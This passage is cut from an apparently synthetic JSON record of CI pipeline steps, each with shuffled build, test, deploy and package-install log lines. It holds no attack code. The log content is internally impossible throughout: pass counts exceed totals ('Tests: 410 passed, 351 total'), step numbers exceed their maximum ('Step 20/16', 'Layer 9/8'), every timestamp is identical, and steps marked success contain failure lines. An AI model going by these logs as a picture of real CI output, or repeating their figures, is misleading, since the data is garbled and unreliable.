          "WARNING: prettier has known vulnerabilities",
          "Checking out master branch",
          "[12:47:23] DEBUG: Initializing service",
          "[12:47:23] ERROR: Connection failed",
          "Compiling utils/handler.rs...",
          "npm install: added 303 packages",
          "Checking out main branch",
          "yarn add: Done in 18.57s",
          "Fetching submodules...",
          "Compiling lib/main.py...",
          "Creating production build...",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] DEBUG: Query executed in 41ms",
          "Compiling components/index.js...",
          "Ready.",
          "Minifying app.js",
          "Cache hit for key-3608",
          "yarn add: Done in 5.78s",
          "pip: Installing build dependencies...",
          "Exception: TypeError",
          "\u2713 All checks passed",
          "Waiting...",
          "npm notice: package.json updated",
          "Optimizing 95 modules...",
          "GET /status - 200 (7ms)",
          "Minifying main.js",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_auth_login",
          "pip: Downloading axios-3.3.tar.gz",
          "[12:47:23] WARN: Deprecated API usage",
          "Checking out main branch",
          "Fetching from https://pypi.org/package.json",
          "Success!",
          "Coverage: 100% statements, 95% branches",
          "Step 1/24: Deploying",
          "Environment: staging",
          "[12:47:23] INFO: Cache refreshed",
          "Coverage: 83% statements, 78% branches",
          "Exception: ValueError",
          "[12:47:23] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/main.py...",
          "Uploading artifact 'dist' (37 files)",
          "Pushing to registry...",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (30MB)",
          "Loading...",
          "npm install: resolved 1705 packages",
          "Time: 79.255s",
          "Image pulled successfully",
          "[12:47:23] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "[12:47:23] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/20: Linting",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: resolved 963 packages",
          "Success!",
          "Optimizing 29 modules...",
          "[12:47:23] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 94% statements, 65% branches",
          "Cache miss for key-6671",
          "Using Node.js 20.2.0",
          "Using Node.js 20.14.10",
          "  PASS: unit/test_api_health.spec.js",
          "pip: Collecting axios",
          "Cache invalidated: dependencies",
          "HEAD is now at 792536a",
          "yarn add: Done in 22.89s",
          "WARNING: express has known vulnerabilities",
          "Success!",
          "Step 20/16: Deploying",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:23] INFO: Starting build process",
          "Step 15/25: Testing",
          "Success!",
          "\u2713 package completed",
          "pip: Downloading prettier-3.20.tar.gz",
          "  PASS: e2e/test_auth_login.spec.js",
          "Success!",
          "[12:47:23] DEBUG: Query executed in 85ms",
          "Step 5/25: Testing",
          "[12:47:23] INFO: Cache refreshed",
          "Installing prettier@3.8.10",
          "\u2713 All checks passed",
          "Success!",
          "Generating source maps...",
          "Using Python 3.12",
          "[12:47:23] INFO: Connecting to database",
          "Generating source maps...",
          "Layer 4/11: RUN command",
          "yarn add: Done in 23.57s",
          "Cache miss for key-9527",
          "[12:47:23] INFO: Connecting to database",
          "Done.",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Completed.",
          "Using Node.js 20.15.7",
          "Tests: 410 passed, 351 total",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "Cache saved successfully",
          "Connection established",
          "pip install: Successfully installed jest-4.7",
          "Step 3/24: Testing",
          "Exception: NullPointerException",
          "Processing...",
          "npm notice: created a lockfile",
          "Loading...",
          "\u2713 Task completed in 4899ms",
          "Using Node.js 17.17.4",
          "\u2713 package completed",
          "GET /health - 200 (87ms)",
          "Step 2/24: Testing",
          "[12:47:23] DEBUG: Query executed in 21ms",
          "  PASS: test_user_create (285ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:23] WARN: Deprecated API usage",
          "Step 8/23: Linting",
          "Already up to date.",
          "OK",
          "HEAD is now at 2a53840",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Connection established",
          "Using Python 3.12",
          "Cache restored successfully (51MB)",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (83MB)",
          "Connection established",
          "Using Python 3.9",
          "[12:47:23] DEBUG: Query executed in 7ms",
          "POST /data - 202 (177ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:23] INFO: Cache refreshed",
          "Tests: 459 passed, 61 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:48:51.432883",
        "finished_at": "2025-11-25T12:48:57.925174",
        "log_lines": [
          "=== Step: deploy_production ===",
          "HEAD is now at 14cc1c0",
          "Step 13/25: Linting",
          "[12:47:23] DEBUG: Memory usage: 1149MB",
          "Done.",
          "OK",
          "[12:47:23] DEBUG: Loading configuration",
          "  PASS: integration/test_db_connect.spec.js",
          "Loading...",
          "Creating production build...",
          "[12:47:23] ERROR: Connection failed",
          "[12:47:23] INFO: Starting build process",
          "Done.",
          "[12:47:23] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Cache miss for key-9957",
          "[12:47:23] WARN: Deprecated API usage",
          "npm install: resolved 1736 packages",
          "Cache invalidated: node_modules",
          "Cache miss for key-1571",
          "pip: Downloading lodash-4.1.tar.gz",
          "Building Docker image...",
          "Cache hit for key-2334",
          "Fetching from https://github.com/package.json",
          "[12:47:23] INFO: Starting build process",
          "Ran 139 tests in 31s",
          "npm notice: created a lockfile",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] DEBUG: Initializing service",
          "Transforming 870 files...",
          "[12:47:23] DEBUG: Initializing service",
          "[12:47:23] INFO: Starting build process",
          "Waiting...",
          "Checking out main branch",
          "Step 16/17: Deploying",
          "[12:47:23] WARN: Deprecated API usage",
          "Step 8/15: Testing",
          "\u2713 deploy completed",
          "Already up to date.",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "yarn add: Done in 5.56s",
          "Tests: 181 passed, 455 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at a363e1a",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] INFO: Request completed",
          "Environment: test",
          "Cache saved successfully",
          "Building Docker image...",
          "  PASS: test_cache_hit (214ms)",
          "\u2713 Task completed in 4610ms",
          "Compiling lib/service.java...",
          "Layer 5/8: COPY command",
          "[12:47:23] DEBUG: Initializing service",
          "Cache hit for key-9308",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "[12:47:23] INFO: Request completed",
          "npm install: added 334 packages",
          "Using Node.js 15.14.2",
          "[12:47:23] DEBUG: Memory usage: 980MB",
          "[12:47:23] DEBUG: Initializing service",
          "Step 3/18: Running migrations",
          "Done.",
          "[12:47:23] DEBUG: Query executed in 87ms",
          "Cache hit for key-9357",
          "Image pulled successfully",
          "Compiling utils/app.ts...",
          "FAILED: test_auth_login",
          "npm notice: package.json updated",
          "[12:47:23] DEBUG: Connection pool: 10 active",
          "Ready.",
          "Cache hit for key-3684",
          "Creating production build...",
          "Cache miss for key-4596",
          "Uploading artifact 'coverage' (1 files)",
          "Fetching submodules...",
          "Test Suites: 46 passed, 31 total",
          "Pushing to registry...",
          "Exception: NullPointerException",
          "Cache miss for key-5118",
          "Compiling components/handler.rs...",
          "Compiling lib/utils.go...",
          "[12:47:23] INFO: Connecting to database",
          "\u2713 All checks passed",
          "[12:47:23] INFO: Processing request",
          "\u2713 test completed",
          "Compiling components/main.py...",
          "Step 15/23: Linting",
          "\u2713 Task completed in 1702ms",
          "Checking out master branch",
          "Test Suites: 46 passed, 36 total",
          "[12:47:23] INFO: Processing request",
          "[12:47:23] WARN: Deprecated API usage",
          "npm install: added 405 packages",
          "Processing...",
          "Test Suites: 22 passed, 13 total",
          "GET /status - 204 (35ms)",
          "Transforming 868 files...",
          "[12:47:23] INFO: Cache refreshed",
          "Creating production build...",
          "npm install: resolved 336 packages",
          "Fetching submodules...",
          "Ran 62 tests in 48s",
          "NODE_ENV=test",
          "Step 2/17: Running migrations",
          "NODE_ENV=test",
          "Transforming 176 files...",
          "Coverage: 83% statements, 62% branches",
          "Pulling image: python:3.11",
          "Cache restored successfully (53MB)",
          "Loading...",
          "Waiting...",
          "Artifact downloaded: 16MB",
          "pip install: Successfully installed axios-1.17",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-105'",
          "Fetching from https://googleapis.com/package.json",
          "[12:47:23] INFO: Connecting to database",
          "Minifying app.js",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "TLS handshake completed",
          "Processing...",
          "Step 2/17: Building",
          "Step 20/22: Running migrations",
          "Test Suites: 19 passed, 42 total",
          "Compiling components/handler.rs...",
          "[12:47:23] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "Step 17/25: Linting",
          "  PASS: integration/test_user_create.spec.js",
          "Building Docker image...",
          "Waiting...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 489 files...",
          "Building Docker image...",
          "Fetching submodules...",
          "Done.",
          "yarn add: Done in 29.32s",
          "Image pulled successfully",
          "  PASS: integration/test_api_health.spec.js",
          "[12:47:23] INFO: Connecting to database",
          "npm install: resolved 1397 packages",
          "Compiling utils/utils.go...",
          "Cache hit for key-4862",
          "Checking out main branch",
          "  PASS: test_db_connect (22ms)",
          "[12:47:23] DEBUG: Query executed in 70ms",
          "GET /health - 201 (38ms)",
          "Uploading artifact 'dist' (43 files)",
          "Connection established",
          "Exception: RuntimeError",
          "\u2717 build failed with exit code 70",
          "Already up to date.",
          "Pushing to registry...",
          "Uploading artifact 'dist' (10 files)",
          "Ran 87 tests in 19s",
          "[12:47:23] INFO: Request completed",
          "Coverage: 99% statements, 95% branches",
          "NODE_ENV=production",
          "Fetching submodules...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: react has known vulnerabilities",
          "[12:47:23] INFO: Connecting to database",
          "Time: 79.304s",
          "Cache miss for key-5455",
          "[12:47:23] DEBUG: Initializing service",
          "Cache saved successfully",
          "FAILED: test_db_connect",
          "Bundling vendor.css",
          "Processing...",
          "  PASS: test_user_create (215ms)",
          "Compiling lib/handler.rs...",
          "TLS handshake completed",
          "Cache miss for key-9939",
          "npm install: added 107 packages",
          "Minifying main.js",
          "Loading...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:48:57.925174",
        "finished_at": "2025-11-25T12:49:07.663611",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_api_health",
          "Coverage: 81% statements, 97% branches",
          "Cache miss for key-7242",
          "Switched to branch 'hotfix/task-919'",
          "[12:47:23] WARN: Deprecated API usage",
          "Time: 80.648s",
          "[12:47:23] WARN: Deprecated API usage",
          "Using Python 3.10",
          "  PASS: e2e/test_db_connect.spec.js",
          "Completed.",
          "  PASS: test_user_create (384ms)",
          "pip: Installing build dependencies...",
          "[12:47:23] DEBUG: Loading configuration",
          "WARNING: lodash has known vulnerabilities",
          "Cache saved successfully",
          "Fetching from https://githubusercontent.com/package.json",
          "npm install: added 235 packages",
          "Minifying vendor.js",
          "Test Suites: 29 passed, 28 total",
          "[12:47:23] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (90MB)",
          "Creating production build...",
          "Fetching from https://googleapis.com/package.json",
          "Cache hit for key-3644",
          "Step 5/16: Linting",
          "HEAD is now at 6951ca6",
          "FAILED: test_cache_hit",
          "Fetching submodules...",
          "Bundling main.js",
          "Compiling components/utils.go...",
          "Step 2/18: Building",
          "Waiting...",
          "Minifying main.js",
          "Verifying...",
          "\u2713 Step 'test' succeeded",
          "\u2713 Step 'build' succeeded",
          "GET /status - 201 (50ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed eslint-2.7",
          "Building Docker image...",
          "Snapshots: 10 passed, 37 total",
          "Compiling lib/handler.rs...",
          "TLS handshake completed",
          "Verifying...",
          "Verifying...",
          "npm install: added 221 packages",
          "  PASS: e2e/test_cache_hit.spec.js",
          "pip: Downloading webpack-1.16.tar.gz",
          "Pushing to registry...",
          "Verifying...",
          "[12:47:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:23] INFO: Cache refreshed",
          "Pulling image: python:3.11",
          "Cache miss for key-5666",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/index.js...",
          "Compiling src/main.py...",
          "Coverage: 93% statements, 72% branches",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Generating source maps...",
          "npm install: added 296 packages",
          "npm notice: created a lockfile",
          "\u2713 validate completed",
          "Cache hit for key-3622",
          "Cache invalidated: dependencies",
          "Coverage: 83% statements, 80% branches",
          "Minifying vendor.js",
          "pip: Downloading lodash-2.18.tar.gz",
          "HEAD is now at 58e92fa",
          "Step 6/19: Deploying",
          "Step 14/18: Deploying",
          "Environment: test",
          "Cache hit for key-7653",
          "Step 4/16: Building",
          "POST /upload - 201 (185ms)",
          "Time: 21.551s",
          "[12:47:23] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (5MB)",
          "[12:47:23] DEBUG: Query executed in 69ms",
          "Creating production build...",
          "HEAD is now at 626de3c",
          "Minifying vendor.js",
          "Finished.",
          "Step 12/24: Deploying",
          "npm install: resolved 1124 packages",
          "\u2713 All checks passed",
          "Transforming 257 files...",
          "Exception: ValueError",
          "yarn add: Done in 4.33s",
          "Cache restored successfully (423MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:23] WARN: Deprecated API usage",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "POST /data - 201 (452ms)",
          "Exception: ValueError",
          "Switched to branch 'feature/task-942'",
          "  PASS: e2e/test_cache_hit.spec.js",
          "OK",
          "pip install: Successfully installed react-5.0",
          "Compiling components/service.java...",
          "[12:47:23] DEBUG: Memory usage: 664MB",
          "Minifying main.js",
          "\u2713 Step 'install' succeeded",
          "pip install: Successfully installed prettier-2.17",
          "Verifying...",
          "Compiling src/main.py...",
          "Verifying...",
          "Pulling image: alpine:18",
          "Ready.",
          "Ran 150 tests in 33s",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-243'",
          "Completed.",
          "\u2713 All checks passed",
          "Loading...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Step 'install' succeeded",
          "[12:47:23] WARN: Deprecated API usage",
          "POST /api - 201 (46ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache saved successfully",
          "Step 12/16: Installing dependencies",
          "POST /data - 200 (302ms)",
          "Time: 115.325s",
          "Artifact uploaded: dist.zip (37MB)",
          "Coverage: 77% statements, 60% branches",
          "Step 5/19: Building",
          "[12:47:23] DEBUG: Memory usage: 944MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Optimizing 28 modules...",
          "Ready.",
          "TLS handshake completed",
          "Minifying vendor.js",
          "Bundling vendor.css",
          "\u2713 Step 'build' succeeded",
          "Cache restored successfully (36MB)",
          "Generating source maps...",
          "Cache restored successfully (334MB)",
          "NODE_ENV=production",
          "OK",
          "[12:47:23] INFO: Connecting to database",
          "Success!",
          "Creating production build...",
          "Installing express@3.8.8",
          "Artifact downloaded: 48MB",
          "Step 6/16: Running migrations",
          "Building Docker image...",
          "Artifact downloaded: 41MB",
          "Layer 9/8: RUN command",
          "Fetching from https://gcr.io/package.json",
          "Snapshots: 6 passed, 19 total",
          "Exception: RuntimeError",
          "[12:47:23] INFO: Starting build process",
          "npm install: added 51 packages",
          "Image pulled successfully",
          "Platform: win32-x64",
          "Using Python 3.11",
          "Compiling components/main.py...",
          "Compiling utils/main.py...",
          "Compiling components/service.java...",
          "Step 13/20: Building",
          "Cache saved successfully",
          "Time: 77.192s",
          "Step 2/24: Testing",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] DEBUG: Initializing service",
          "Fetching submodules...",
          "[12:47:23] WARN: Deprecated API usage",
          "GET /health - 201 (84ms)",
          "Step 1/25: Running migrations",
          "  PASS: integration/test_user_create.spec.js",
          "[12:47:23] INFO: Request completed",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Already up to date.",
          "pip: Downloading webpack-4.18.tar.gz",
          "Cache invalidated: dependencies",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:49:07.663611",
        "finished_at": "2025-11-25T12:49:56.355795",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 Task completed in 1285ms",
          "Compiling src/index.js...",
          "Optimizing 68 modules...",
          "Fetching from https://googleapis.com/package.json",
          "Building Docker image...",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] ERROR: Connection failed",
          "[12:47:23] DEBUG: Initializing service",
          "\u2713 Task completed in 1305ms",
          "Step 7/25: Testing",
          "Artifact downloaded: 44MB",
          "Cache restored successfully (363MB)",
          "[12:47:23] INFO: Connecting to database",
          "OK",
          "[12:47:23] INFO: Request completed",
          "pip: Installing build dependencies...",
          "FAILED: test_auth_login",
          "Generating source maps...",
          "WARNING: react has known vulnerabilities",
          "Step 6/15: Testing",
          "[12:47:23] WARN: Deprecated API usage",
          "Using Node.js 19.2.7",
          "Step 20/22: Testing",
          "Done.",
          "[12:47:23] INFO: Processing request",
          "Artifact uploaded: dist.zip (12MB)",
          "Processing...",
          "Layer 9/12: RUN command",
          "[12:47:23] DEBUG: Connection pool: 20 active",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:47:23] INFO: Starting build process",
          "Artifact downloaded: 19MB",
          "Verifying...",
          "NODE_ENV=test",
          "TLS handshake completed",
          "Step 4/18: Running migrations",
          "\u2713 lint completed",
          "[12:47:23] DEBUG: Loading configuration",
          "WARNING: react has known vulnerabilities",
          "Fetching from https://gcr.io/package.json",
          "Waiting...",
          "Creating production build...",
          "Compiling utils/service.java...",
          "Tests: 63 passed, 128 total",
          "[12:47:23] INFO: Request completed",
          "Step 17/19: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 14.14.7",
          "Compiling utils/utils.go...",
          "Completed.",
          "Processing...",
          "Layer 8/13: ENV command",
          "Test Suites: 23 passed, 11 total",
          "Bundling styles.css",
          "npm install: added 357 packages",
          "pip: Collecting eslint",
          "Processing...",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out master branch",
          "Fetching from https://googleapis.com/package.json",
          "Coverage: 86% statements, 81% branches",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Environment: staging",
          "\u2713 build completed",
          "Done.",
          "Step 6/17: Linting",
          "Compiling src/service.java...",
          "\u2713 All checks passed",
          "[12:47:23] INFO: Processing request",
          "Ran 83 tests in 58s",
          "Using Python 3.9",
          "Artifact uploaded: dist.zip (43MB)",
          "npm notice: created a lockfile",
          "[12:47:23] WARN: Deprecated API usage",
          "Cache restored successfully (194MB)",
          "[12:47:23] INFO: Cache refreshed",
          "Tests: 374 passed, 492 total",
          "OK",
          "Optimizing 23 modules...",
          "Test Suites: 13 passed, 31 total",
          "pip: Downloading axios-3.13.tar.gz",
          "[12:47:23] ERROR: Connection failed",
          "Compiling src/main.py...",
          "pip: Collecting axios",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:47:23] DEBUG: Loading configuration",
          "\u2713 package completed",
          "Finished.",
          "\u2713 Step 'install' succeeded",
          "Using Python 3.10",
          "npm install: added 156 packages",
          "Cache invalidated: dependencies",
          "NODE_ENV=development",
          "POST /upload - 200 (67ms)",
          "[12:47:23] INFO: Processing request",
          "npm install: resolved 506 packages",
          "Transforming 949 files...",
          "Test Suites: 18 passed, 29 total",
          "Bundling styles.css",
          "\u2713 package completed",
          "Step 10/16: Testing",
          "Artifact uploaded: dist.zip (48MB)",
          "Connection established",
          "[12:47:23] INFO: Starting build process",
          "WARNING: react has known vulnerabilities",
          "Generating source maps...",
          "Fetching submodules...",
          "Transforming 441 files...",
          "Cache saved successfully",
          "Platform: linux-x64",
          "Building Docker image...",
          "Pushing to registry...",
          "[12:47:23] WARN: Deprecated API usage",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:18",
          "Cache invalidated: dependencies",
          "Artifact uploaded: build.tar.gz (19MB)",
          "WARNING: express has known vulnerabilities",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 42 passed, 5 total",
          "npm install: added 275 packages",
          "Verifying...",
          "Using Node.js 18.7.5",
          "Cache miss for key-7642",
          "Image pulled successfully",
          "Cache hit for key-4282",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 11",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Switched to branch 'bugfix/task-237'",
          "Minifying main.js",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:18",
          "pip: Installing build dependencies...",
          "Fetching from https://pypi.org/package.json",
          "Using Node.js 16.4.7",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "POST /upload - 201 (469ms)",
          "[12:47:23] DEBUG: Connection pool: 12 active",
          "pip install: Successfully installed jest-2.2",
          "[12:47:23] DEBUG: Memory usage: 1076MB",
          "Pushing to registry...",
          "[12:47:23] ERROR: Connection failed",
          "  PASS: test_auth_login (245ms)",
          "npm install: resolved 734 packages",
          "[12:47:23] DEBUG: Query executed in 62ms",
          "Processing...",
          "\u2713 package completed",
          "npm notice: package.json updated",
          "Time: 16.62s",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 4/23: Building",
          "[12:47:23] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "GET /health - 204 (50ms)",
          "Switched to branch 'bugfix/task-111'",
          "[12:47:23] INFO: Request completed",
          "npm install: added 312 packages",
          "Cache invalidated: build",
          "[12:47:23] INFO: Cache refreshed",
          "[12:47:23] DEBUG: Memory usage: 553MB",
          "npm install: resolved 831 packages",
          "HEAD is now at 49bc237",
          "Creating production build...",
          "Installing jest@5.20.10",
          "Layer 10/10: RUN command",
          "Cache saved successfully",
          "Ready.",
          "Transforming 104 files...",
          "Step 18/24: Testing",
          "Minifying app.js",
          "TLS handshake completed",
          "Creating production build...",
          "[12:47:23] DEBUG: Memory usage: 1819MB",
          "Layer 10/9: COPY command",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:49:56.355795",
        "finished_at": "2025-11-25T12:50:12.586523",
        "log_lines": [
          "=== Step: setup_node ===",
          "GET /api - 204 (3ms)",
          "Tests: 483 passed, 469 total",
          "\u2713 Task completed in 3682ms",
          "Layer 9/9: COPY command",
          "Step 4/21: Linting",
          "Compiling utils/handler.rs...",
          "\u2713 All checks passed",
          "\u2713 lint completed",
          "\u2713 deploy completed",
          "Uploading artifact 'coverage' (45 files)",
          "NODE_ENV=development",
          "WARNING: express has known vulnerabilities",
          "Step 12/20: Deploying",
          "pip: Installing build dependencies...",
          "Done.",
          "[12:47:23] DEBUG: Connection pool: 3 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: e2e/test_auth_login.spec.js",
          "pip install: Successfully installed lodash-3.14",
          "\u2713 validate completed",
          "Pulling image: alpine:3.11",
          "NODE_ENV=development",
          "Step 14/18: Linting",
          "Compiling utils/handler.rs...",
          "Compiling utils/service.java...",
          "Time: 48.766s",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "[12:47:23] WARN: Deprecated API usage",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Image pulled successfully",
          "Pulling image: alpine:18",
          "Cache saved successfully",
          "OK",
          "Switched to branch 'bugfix/task-246'",
          "[12:47:23] DEBUG: Query executed in 81ms",
          "\u2713 build completed",
          "pip: Installing build dependencies...",
          "\u2713 Step 'test' succeeded",
          "Using Node.js 15.2.4",
          "Cache miss for key-7586",
          "  PASS: test_api_health (186ms)",
          "[12:47:23] DEBUG: Initializing service",
          "Tests: 427 passed, 312 total",
          "Uploading artifact 'dist' (47 files)",
          "  PASS: test_db_connect (155ms)",
          "Generating source maps...",
          "[12:47:23] DEBUG: Memory usage: 131MB",
          "Installing webpack@5.17.4",
          "  PASS: test_user_create (252ms)",
          "[12:47:23] ERROR: Connection failed",
          "GET /health - 204 (22ms)",
          "Done.",
          "\u2717 build failed with exit code 106",
          "Step 1/24: Linting",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Platform: win32-x64",
          "[12:47:23] INFO: Cache refreshed",
          "Transforming 179 files...",
          "FAILED: test_user_create",
          "Compiling utils/index.js...",
          "Exception: ValueError",
          "Already up to date.",
          "\u2713 All checks passed",
          "Snapshots: 41 passed, 19 total",
          "TLS handshake completed",
          "Fetching from https://npmjs.org/package.json",
          "Image pulled successfully",
          "HEAD is now at 760250e",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "Installing express@1.7.7",
          "Done.",
          "Waiting...",
          "Cache saved successfully",
          "Time: 80.918s",
          "[12:47:23] INFO: Connecting to database",
          "[12:47:23] DEBUG: Connection pool: 7 active",
          "Step 8/22: Building",
          "Checking out master branch",
          "[12:47:23] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Platform: linux-x64",
          "Transforming 549 files...",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "[12:47:23] DEBUG: Query executed in 41ms",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Pulling image: alpine:18",
          "[12:47:23] INFO: Processing request",
          "  PASS: test_user_create (397ms)",
          "yarn add: Done in 28.30s",
          "WARNING: webpack has known vulnerabilities",
          "Waiting...",
          "FAILED: test_db_connect",
          "Ran 161 tests in 16s",
          "npm install: resolved 1574 packages",
          "[12:47:23] INFO: Connecting to database",
          "Pushing to registry...",
          "Image pulled successfully",
          "Uploading artifact 'coverage' (9 files)",
          "Verifying...",
          "Compiling utils/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 20/24: Building",
          "GET /health - 204 (55ms)",
          "Cache invalidated: dependencies",
          "\u2713 Step 'install' succeeded",
          "npm notice: package.json updated",
          "Compiling src/app.ts...",
          "\u2713 deploy completed",
          "Ready.",
          "Optimizing 72 modules...",
          "Generating source maps...",
          "Artifact downloaded: 40MB",
          "\u2713 All checks passed",
          "Pulling image: node:latest",
          "Tests: 222 passed, 226 total",
          "Cache hit for key-3583",
          "[12:47:23] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Loading...",
          "npm notice: created a lockfile",
          "Verifying...",
          "Step 11/19: Deploying",
          "[12:47:23] DEBUG: Loading configuration",
          "[12:47:23] INFO: Cache refreshed",
          "Cache miss for key-1303",
          "npm install: added 249 packages",
          "npm install: added 86 packages",
          "pip: Downloading axios-2.0.tar.gz",
          "Waiting...",
          "Cache hit for key-8601",
          "Cache saved successfully",
          "Installing axios@2.3.4",
          "\u2713 Task completed in 4145ms",
          "[12:47:23] ERROR: Connection failed",
          "Ready.",
          "  PASS: integration/test_db_connect.spec.js",
          "npm install: resolved 546 packages",
          "Finished.",
          "GET /health - 201 (28ms)",
          "Layer 3/11: ENV command",
          "Done.",
          "Using Node.js 18.19.10",
          "pip: Downloading jest-5.18.tar.gz",
          "Done.",
          "Step 11/23: Building",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Installing lodash@1.14.0",
          "OK",
          "  PASS: integration/test_auth_login.spec.js",
          "Verifying...",
          "Building Docker image...",
          "[12:47:23] WARN: Deprecated API usage",
          "Step 2/17: Deploying",
          "Fetching from https://github.com/package.json",
          "Generating source maps...",
          "[12:47:23] DEBUG: Query executed in 75ms",
          "Pulling image: node:3.11",
          "[12:47:23] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Step 15/24: Linting",
          "Creating production build...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /health - 200 (20ms)",
          "Test Suites: 14 passed, 41 total",
          "pip: Downloading react-1.1.tar.gz",
          "Creating production build...",
          "Checking out main branch",
          "Done.",
          "Done.",
          "[12:47:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "[12:47:23] WARN: Deprecated API usage",
          "  PASS: test_user_create (159ms)",
          "\u2713 Step 'install' succeeded",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:50:12.586523",
        "finished_at": "2025-11-25T12:50:22.324960",
        "log_lines": [
          "=== Step: save_cache ===",
          "Loading...",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "Success!",
          "[12:47:23] WARN: Deprecated API usage",
          "[12:47:23] DEBUG: Connection pool: 2 active",
          "Pushing to registry...",
          "Pushing to registry...",
          "Fetching from https://amazonaws.com/package.json",
          "Creating production build...",
